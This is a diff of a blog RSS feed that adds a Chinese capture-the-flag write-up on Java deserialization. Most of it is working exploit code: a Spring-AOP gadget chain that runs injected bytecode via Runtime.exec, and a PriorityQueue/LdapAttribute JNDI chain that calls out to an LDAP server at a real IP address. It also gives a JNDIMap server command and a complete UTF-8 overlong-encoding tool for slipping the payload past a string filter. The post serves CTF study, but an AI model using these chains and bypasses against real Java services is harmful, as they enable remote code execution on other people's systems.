@@ -1,2 +1,518 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Blog Title</title><link>https://CHHHCHHOH.github.io/chhhchhoh.github.com</link><description>Blog description</description><copyright>Blog Title</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://CHHHCHHOH.github.io/chhhchhoh.github.com</link></image><lastBuildDate>Thu, 17 Apr 2025 14:00:54 +0000</lastBuildDate><managingEditor>Blog Title</managingEditor><ttl>60</ttl><webMaster>Blog Title</webMaster></channel></rss>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>CHHHCHHOH's BLOG</title><link>https://chhhchhoh.github.io</link><description>重构了一下</description><copyright>CHHHCHHOH's BLOG</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://chhhchhoh.github.io</link></image><lastBuildDate>Thu, 17 Apr 2025 14:13:30 +0000</lastBuildDate><managingEditor>CHHHCHHOH's BLOG</managingEditor><ttl>60</ttl><webMaster>CHHHCHHOH's BLOG</webMaster><item><title>justDeserialize</title><link>https://chhhchhoh.github.io/post/justDeserialize.html</link><description>这里用的是Spring-Aop的链子
+
+```java
+package org.example.spring;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.springframework.aop.aspectj.AspectJAroundAdvice;
+import org.springframework.aop.aspectj.AspectJExpressionPointcut;
+import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
+import org.springframework.aop.framework.Advised;
+import org.springframework.aop.framework.AdvisedSupport;
+import org.springframework.aop.support.DefaultIntroductionAdvisor;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+
+public class SpringAop {
+    public static void main(String[] args) throws Throwable {
+
+        /// sink TemplatesImpl#getOutputProperties java原生
+        byte[] code = getTemplates();
+        byte[][] codes = {code};
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, '_name', 'useless');
+        setFieldValue(templates, '_tfactory',  new TransformerFactoryImpl(
+        ));
+        setFieldValue(templates, '_bytecodes', codes);
+
+        /// AspectJAroundAdvice#invoke -&gt; AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs -&gt; xxx#yyy() spring-aop
+        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(TemplatesImpl.class.getDeclaredMethod('getOutputProperties'), new AspectJExpressionPointcut(),new SingletonAspectInstanceFactory(templates)); // 调用任意对象的无参方法 templates#getOutputProperties()
+//        Constructor&lt;ReflectiveMethodInvocation&gt; reflectiveMethodInvocationConstructor = ReflectiveMethodInvocation.class.getDeclaredConstructor(Object.class, Object.class, Method.class, Object[].class, Class.class, List.class);
+//        reflectiveMethodInvocationConstructor.setAccessible(true);
+//        ArrayList&lt;Object&gt; list = new ArrayList&lt;&gt;();
+//        list.add(aspectJAroundAdvice);
+//        ReflectiveMethodInvocation  mi = reflectiveMethodInvocationConstructor.newInstance(null, null, String.class.getMethod('toString'), null, null, list);
+//        aspectJAroundAdvice.invoke(mi);
+//        invocation.proceed();
+
+        /// Proxy#xxx(除了equals,hashcode) -&gt; JdkDynamicAopProxy#invoke -&gt; ReflectiveMethodInvocation#proceed -&gt; AspectJAroundAdvice#invoke spring-aop
+        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(aspectJAroundAdvice);
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.addAdvisor(advisor);
+        Constructor JdkDynamicAopProxyconstructor = Class.forName('org.springframework.aop.framework.JdkDynamicAopProxy').getConstructor(AdvisedSupport.class);
+        JdkDynamicAopProxyconstructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) JdkDynamicAopProxyconstructor.newInstance(advisedSupport);
+        Advised o = (Advised) Proxy.newProxyInstance(Advised.class.getClassLoader(), new Class[]{Advised.class}, handler);
+
+        /// BadAttributeValueExpException#readObject -&gt; toString java原生
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+        setFieldValue(badAttributeValueExpException, 'val', o);
+
+        unserialize(serialize(badAttributeValueExpException));
+    }
+    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
+        Field dField = obj.getClass().getDeclaredField(field);
+        dField.setAccessible(true);
+        dField.set(obj, val);
+    }
+    public static byte[] serialize(Object obj) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        return baos.toByteArray();
+    }
+    public static Object unserialize(byte[] bytes) throws Exception{
+        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        return ois.readObject();
+
+    }
+    public static byte[] getTemplates() throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass template = pool.makeClass('MyTemplate');
+        template.setSuperclass(pool.get('com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet'));
+        String block = 'Runtime.getRuntime().exec(\'calc\');';
+        template.makeClassInitializer().insertBefore(block);
+        return template.toBytecode();
+    }
+}
+```
+
+这里BadAttributeValueExpException被ban了，我们用PriorityQueue来触发compare
+
+![Image](https://github.com/user-attachments/assets/29a0a055-a763-4ee1-bccf-b8b0b9193ba5)
+
+然后我们要找一个无参的sink
+
+### 方法一
+
+这里用的是LdapAttribute#getAttributeDefinition来进行jndi 二次反序列化
+
+```java
+import org.springframework.aop.aspectj.AspectJAroundAdvice;
+import org.springframework.aop.aspectj.AspectJExpressionPointcut;
+import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
+import org.springframework.aop.framework.AdvisedSupport;
+import org.springframework.aop.support.DefaultIntroductionAdvisor;
+import javax.naming.CompositeName;
+import javax.naming.directory.BasicAttribute;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.Base64;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+public class SpringAop {
+    public static void main(String[] args) throws Throwable {
+
+        /// sink LdapAttribute#getAttributeDefinition java原生
+        Class clazz = Class.forName('com.sun.jndi.ldap.LdapAttribute');
+        Constructor constructor = clazz.getDeclaredConstructor(String.class);
+        constructor.setAccessible(true);
+        BasicAttribute ldapAttribute = (BasicAttribute) constructor.newInstance('name');
+        setFieldValue(ldapAttribute, 'baseCtxURL', 'ldap://124.221.19.214:2333');
+        setFieldValue(ldapAttribute, 'rdn', new CompositeName('a/b'));
+        
+        /// AspectJAroundAdvice#invoke -&gt; AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs -&gt; xxx#yyy() spring-aop
+        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(clazz.getDeclaredMethod('getAttributeDefinition'), new AspectJExpressionPointcut(),new SingletonAspectInstanceFactory(ldapAttribute)); // 调用任意对象的无参方法 LdapAttribute#getAttributeDefinition()
+
+        /// Proxy#xxx(除了equals,hashcode) -&gt; JdkDynamicAopProxy#invoke -&gt; ReflectiveMethodInvocation#proceed -&gt; AspectJAroundAdvice#invoke spring-aop
+        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(aspectJAroundAdvice);
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.addAdvisor(advisor);
+        Constructor JdkDynamicAopProxyconstructor = Class.forName('org.springframework.aop.framework.JdkDynamicAopProxy').getConstructor(AdvisedSupport.class);
+        JdkDynamicAopProxyconstructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) JdkDynamicAopProxyconstructor.newInstance(advisedSupport);
+        Comparator o = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
+
+        /// PriorityQueue#readObject -&gt; compare java原生
+        PriorityQueue priorityQueue = new PriorityQueue();
+        setFieldValue(priorityQueue,'comparator',o);
+        setFieldValue(priorityQueue,'queue',new Object[]{1,2}); // compareObject.compare(1,2)
+        setFieldValue(priorityQueue,'size',2);
+        byte[] ser = serialize(priorityQueue);
+        System.out.println(Base64.getEncoder().encodeToString(ser));
+        unserialize(ser);
+    }
+    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
+        Field dField = obj.getClass().getDeclaredField(field);
+        dField.setAccessible(true);
+        dField.set(obj, val);
+    }
+    public static byte[] serialize(Object obj) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        return baos.toByteArray();
+    }
+    public static Object unserialize(byte[] bytes) throws Exception{
+        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        return ois.readObject();
+    }
+}
+```
+
+这里我用JNDIMap起了服务端，test.ser是用的之前Templates作为sink生成的没有base64编码的序列化数据
+
+```bash
+java -jar JNDIMap-0.0.1.jar -i 124.221.19.214 -l 2333 -p 3232 -u /Deserialize/FromFile/test.ser
+```
+
+![Image](https://github.com/user-attachments/assets/66e96edd-f9e3-4a43-b140-ac9f660ebe26)
+
+成功弹计算器
+
+![Image](https://github.com/user-attachments/assets/74e379b9-b604-45b3-adf9-7ce5b687a9a2)
+
+但是发包被ban了，因为这里用了javax.naming.CompositeName，所以要绕过字符串检测
+
+![Image](https://github.com/user-attachments/assets/9ced416d-a982-4edc-afc3-e8fb429e6299)
+
+[[这里用Whoopsunix师傅的项目绕过](https://github.com/Whoopsunix/utf-8-overlong-encoding)](https://github.com/Whoopsunix/utf-8-overlong-encoding)
+
+```java
+/**
+ * @author Whoopsunix
+ * &lt;p&gt;
+ * UTF-8 混淆
+ */
+public class UTF8BytesMix {
+
+    public static byte[] resultBytes = new byte[0];
+    public static byte[] originalBytes = new byte[0];
+
+    // 加密字节位数
+    public static int type = 2; //3
+
+    // 原 byte[] 坐标
+    public static int index = 0;
+
+    final static byte TC_CLASSDESC = (byte) 0x72;
+    final static byte TC_PROXYCLASSDESC = (byte) 0x7d;
+    final static byte TC_STRING = (byte) 0x74;
+    final static byte TC_REFERENCE = (byte) 0x71;
+    final static byte TC_LONGSTRING = (byte) 0x7C;
+    final static byte TC_ARRAY = (byte) 0x75;
+    final static byte TC_ENDBLOCKDATA = (byte) 0x78;
+    final static byte TC_NULL = (byte) 0x70;
+
+
+    final static byte Byte = (byte) 0x42;
+    final static byte Char = (byte) 0x43;
+    final static byte Double = (byte) 0x44;
+    final static byte Float = (byte) 0x46;
+    final static byte Integer = (byte) 0x49;
+    final static byte Long = (byte) 0x4a;
+    final static byte Object_L = (byte) 0x4c;
+    final static byte Short = (byte) 0x53;
+    final static byte Boolean = (byte) 0x5a;
+    final static byte Array = (byte) 0x5b;
+
+
+    public UTF8BytesMix(byte[] originalBytes) {
+        this.originalBytes = originalBytes;
+    }
+
+    public static byte[] builder() {
+        while (index &lt; originalBytes.length) {
+            byte b = originalBytes[index];
+            byteAdd(b);
+
+            if (b == TC_CLASSDESC) {
+                changeTC_CLASSDESC();
+            } else if (b == TC_PROXYCLASSDESC) {
+                changeTC_PROXYCLASSDESC();
+            } else if (b == TC_STRING) {
+                changeTC_STRING();
+            }
+
+            index++;
+        }
+        return resultBytes;
+    }
+
+    public static void changeTC_PROXYCLASSDESC() {
+        int interfaceCount = ((originalBytes[index + 1] &amp; 0xFF) &lt;&lt; 24) |
+                ((originalBytes[index + 2] &amp; 0xFF) &lt;&lt; 16) |
+                ((originalBytes[index + 3] &amp; 0xFF) &lt;&lt; 8) |
+                (originalBytes[index + 4] &amp; 0xFF);
+        if (interfaceCount &gt; 0xff || interfaceCount &lt; 0x00)
+            return;
+
+        for (int i = 0; i &lt; 4; i++) {
+            byteAdd(originalBytes[index + 1]);
+            index++;
+        }
+
+        int length = ((originalBytes[index + 1] &amp; 0xFF) &lt;&lt; 8) | (originalBytes[index + 2] &amp; 0xFF);
+        byte[] originalValue = new byte[length];
+        System.arraycopy(originalBytes, index + 3, originalValue, 0, length);
+        index += 3 + length;
+
+        encode(originalValue, type);
+        index--;
+    }
+
+
+    public static boolean changeTC_CLASSDESC() {
+        /**
+         * 类信息
+         */
+        boolean isTC_CLASSDESC = changeTC_STRING();
+        if (!isTC_CLASSDESC) {
+            return false;
+        }
+        index++;
+
+        /**
+         * SerialVersionUID + ClassDescFlags
+         */
+        byte[] serialVersionUID = new byte[9];
+        System.arraycopy(originalBytes, index, serialVersionUID, 0, 9);
+        for (int i = 0; i &lt; serialVersionUID.length; i++) {
+            byteAdd(serialVersionUID[i]);
+        }
+        index += 9;
+
+        /**
+         * FieldCount
+         */
+        byte[] fieldCount = new byte[2];
+        System.arraycopy(originalBytes, index, fieldCount, 0, 2);
+        for (int i = 0; i &lt; fieldCount.length; i++) {
+            byteAdd(fieldCount[i]);
+        }
+        int fieldCounts = ((fieldCount[0] &amp; 0xFF) &lt;&lt; 8) | (fieldCount[1] &amp; 0xFF);
+        index += 2;
+
+        for (int i = 0; i &lt; fieldCounts; i++) {
+            boolean isFiledOver = false;
+
+            /**
+             * FieldName
+             */
+            if (originalBytes[index] == Byte
+                    || originalBytes[index] == Char
+                    || originalBytes[index] == Double
+                    || originalBytes[index] == Float
+                    || originalBytes[index] == Integer
+                    || originalBytes[index] == Long
+                    || originalBytes[index] == Object_L
+                    || originalBytes[index] == Short
+                    || originalBytes[index] == Boolean
+                    || originalBytes[index] == Array) {
+                // Object
+                byteAdd(originalBytes[index]);
+                index++;
+
+                int fieldLength = ((originalBytes[index] &amp; 0xFF) &lt;&lt; 8) | (originalBytes[index + 1] &amp; 0xFF);
+                byte[] originalFieldName = new byte[fieldLength];
+                System.arraycopy(originalBytes, index + 2, originalFieldName, 0, fieldLength);
+                index += 2 + fieldLength;
+                encode(originalFieldName, type);
+            }
+
+            /**
+             * Class Name
+             *
+             * 也规避了这种情况
+             *          Index 0:
+             *           Integer - I - 0x49
+             *           @FieldName
+             *             @Length - 4 - 0x00 04
+             *             @Value - size - 0x73 69 7a 65
+             */
+            // TC_STRING 0x74
+            if (originalBytes[index] == TC_STRING) {
+
+                byteAdd(originalBytes[index]);
+                index++;
+
+                int classLength = ((originalBytes[index] &amp; 0xFF) &lt;&lt; 8) | (originalBytes[index + 1] &amp; 0xFF);
+                byte[] originalClassName = new byte[classLength];
+                System.arraycopy(originalBytes, index + 2, originalClassName, 0, classLength);
+                index += 2 + classLength;
+                encode(originalClassName, type);
+                isFiledOver = true;
+            } else if (originalBytes[index] == TC_REFERENCE) {
+                /**
+                 * Index 0:
+                 * Object - L - 0x4c
+                 * @FieldName
+                 * @Length - 9 - 0x00 09
+                 * @Value - decorated - 0x64 65 63 6f 72 61 74 65 64
+                 * @ClassName
+                 *         TC_REFERENCE - 0x71
+                 * @Handler - 8257537 - 0x00 7e 00 01
+                 */
+                byte[] reference = new byte[5];
+                System.arraycopy(originalBytes, index, reference, 0, 5);
+                for (int j = 0; j &lt; reference.length; j++) {
+                    byteAdd(reference[j]);
+                }
+                index += 5;
+                isFiledOver = true;
+            }
+
+            // todo 看看其他可能未识别到的类型
+//            if(i &lt; fieldCounts - 1 &amp;&amp; !isFiledOver) {
+//                while (true) {
+//                    if (!isField(originalBytes, index)) {
+//                        byteAdd(originalBytes[index]);
+//                        index++;
+//                    } else {
+//                        break;
+//                    }
+//                }
+//            }
+
+        }
+
+        // 循环需要
+        index--;
+        return true;
+    }
+
+    public static boolean changeTC_STRING() {
+        int length = ((originalBytes[index + 1] &amp; 0xFF) &lt;&lt; 8) | (originalBytes[index + 2] &amp; 0xFF);
+        // 溢出
+        if (length &gt; 0xff || length &lt; 0x00)
+            return false;
+
+        // 原始内容
+        byte[] originalValue = new byte[length];
+        System.arraycopy(originalBytes, index + 3, originalValue, 0, length);
+        // 非全部可见字符，可能存在的报错，不继续执行
+        if (!isByteVisible(originalValue)) {
+            return false;
+        }
+
+        index += 3 + length;
+        encode(originalValue, type);
+
+        index--;
+        return true;
+    }
+
+
+    public static boolean isField(byte[] checkBytes, int index) {
+        if (!(checkBytes[index] == Byte
+                || checkBytes[index] == Char
+                || checkBytes[index] == Double
+                || checkBytes[index] == Float
+                || checkBytes[index] == Integer
+                || checkBytes[index] == Long
+                || checkBytes[index] == Object_L
+                || checkBytes[index] == Short
+                || checkBytes[index] == Boolean
+                || checkBytes[index] == Array)) {
+            return false;
+        }
+
+        int length = ((checkBytes[index + 1] &amp; 0xFF) &lt;&lt; 8) | (checkBytes[index + 2] &amp; 0xFF);
+        if (length &gt; 0xff || length &lt; 0x00)
+            return false;
+        byte[] lengthBytes = new byte[length];
+        try {
+            System.arraycopy(checkBytes, index + 3, lengthBytes, 0, length);
+        } catch (Exception e) {
+            return false;
+        }
+
+        return true;
+    }
+
+    /**
+     * 加密
+     *
+     * @return
+     */
+    public static void encode(byte[] originalValue, int type) {
+        if (type == 3) {
+            // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx
+            int newLength = originalValue.length * 3;
+
+            byteAdd((byte) ((newLength &gt;&gt; 8) &amp; 0xFF));
+            byteAdd((byte) (newLength &amp; 0xFF));
+
+            for (int i = 0; i &lt; originalValue.length; i++) {
+                char c = (char) originalValue[i];
+                byteAdd((byte) (0xE0 | ((c &gt;&gt; 12) &amp; 0x0F)));
+                byteAdd((byte) (0x80 | ((c &gt;&gt; 6) &amp; 0x3F)));
+                byteAdd((byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F)));
+            }
+
+        } else {
+            // 2 byte format: 110xxxxx 10xxxxxx
+            int newLength = originalValue.length * 2;
+
+            byteAdd((byte) ((newLength &gt;&gt; 8) &amp; 0xFF));
+            byteAdd((byte) (newLength &amp; 0xFF));
+
+            for (int i = 0; i &lt; originalValue.length; i++) {
+                char c = (char) originalValue[i];
+                byteAdd((byte) (0xC0 | ((c &gt;&gt; 6) &amp; 0x1F)));
+                byteAdd((byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F)));
+            }
+        }
+
+
+    }
+
+    /**
+     * 判断字节是否在可见字符的 ASCII 范围内
+     *
+     * @param bytes
+     * @return
+     */
+    public static boolean isByteVisible(byte[] bytes) {
+        for (byte b : bytes) {
+            if (b &lt; 32 || b &gt; 126) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    public static void byteAdd(byte b) {
+        byte[] newBytes = new byte[resultBytes.length + 1];
+        System.arraycopy(resultBytes, 0, newBytes, 0, resultBytes.length);
+        newBytes[resultBytes.length] = b;
+        resultBytes = newBytes;
+    }
+}
+```
+
+序列化的部分用这句修改就可以了
+
+```java
+/// UTF8Overlong绕过字符串检测
+System.out.println(Base64.getEncoder().encodeToString(new UTF8BytesMix(serialize(priorityQueue)).builder()));
+```
+
+成功弹计算器
+
+![Image](https://github.com/user-attachments/assets/360010d5-0f2e-469a-b1e0-9a0f16b91244)
+
+### 方法二
+
+实际上比赛时是不出网的，所以我们不能打jndi，可以用hsqldb打二次反序列化，改个sink链就可以了。</description><guid isPermaLink="true">https://chhhchhoh.github.io/post/justDeserialize.html</guid><pubDate>Thu, 17 Apr 2025 14:00:26 +0000</pubDate></item></channel></rss>
